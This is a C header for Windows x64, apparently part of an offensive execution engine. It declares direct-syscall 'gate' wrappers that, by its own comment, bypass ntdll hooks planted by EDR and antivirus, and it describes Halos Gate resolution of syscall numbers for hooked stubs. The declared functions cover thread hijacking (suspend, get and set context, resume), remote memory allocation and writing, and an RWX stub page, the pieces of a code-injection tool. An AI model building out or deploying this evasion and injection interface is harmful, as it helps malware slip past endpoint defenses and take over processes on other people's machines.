/*
 * syscall_gate.h — Direct Syscall Interface (Enhancement 3)
 * execution_engine/syscall_gate/syscall_gate.h
 *
 * Windows x64 | MinGW/Clang | Intel x86-64 ABI
 *
 * Typed wrappers that call NT syscalls via `syscall` instruction directly,
 * bypassing kernel32/ntdll API-layer hooks planted by EDR/AV.
 *
 * SSN resolution:
 *   For each target export in ntdll, inspect the first 4 bytes:
 *     {4C 8B D1 B8} → clean stub → SSN = *(WORD *)(stub+4)
 *     {E9 ...}      → hooked    → Halos Gate: walk sorted-by-VA
 *                                 neighbors until clean; SSN by offset
 *
 * Link: -lkernel32
 */
#pragma once
#include <windows.h>

#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

/* Mirror WDK types — avoids DDK dependency */
typedef struct _SGX_OBJ_ATTR {
    ULONG   Length;
    HANDLE  RootDirectory;
    PVOID   ObjectName;
    ULONG   Attributes;
    PVOID   SecurityDescriptor;
    PVOID   SecurityQualityOfService;
} SGX_OBJ_ATTR;

typedef struct _SGX_CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} SGX_CLIENT_ID;

/*
 * sgx_init  — resolve all SSNs, allocate RWX stub page, write gate stubs.
 * sgx_cleanup — free stub page.
 */
BOOL sgx_init(void);
void sgx_cleanup(void);

/* Thread gates */
NTSTATUS sgx_NtOpenThread      (PHANDLE out, ACCESS_MASK access, DWORD tid);
NTSTATUS sgx_NtSuspendThread   (HANDLE hThread, PULONG prev_suspend);
NTSTATUS sgx_NtGetContextThread(HANDLE hThread, PCONTEXT ctx);
NTSTATUS sgx_NtSetContextThread(HANDLE hThread, PCONTEXT ctx);
NTSTATUS sgx_NtResumeThread    (HANDLE hThread, PULONG prev_suspend);

/* Virtual memory gates */
NTSTATUS sgx_NtAllocateVirtualMemory(HANDLE hProc, PVOID *base, SIZE_T *size,
                                      ULONG alloc_type, ULONG protect);
NTSTATUS sgx_NtWriteVirtualMemory   (HANDLE hProc, PVOID base, PVOID buf,
                                      SIZE_T len, PSIZE_T written);
NTSTATUS sgx_NtFreeVirtualMemory    (HANDLE hProc, PVOID *base, PSIZE_T size,
                                      ULONG free_type);
/* Process gate */
NTSTATUS sgx_NtOpenProcess          (PHANDLE out, ACCESS_MASK access, DWORD pid);                                      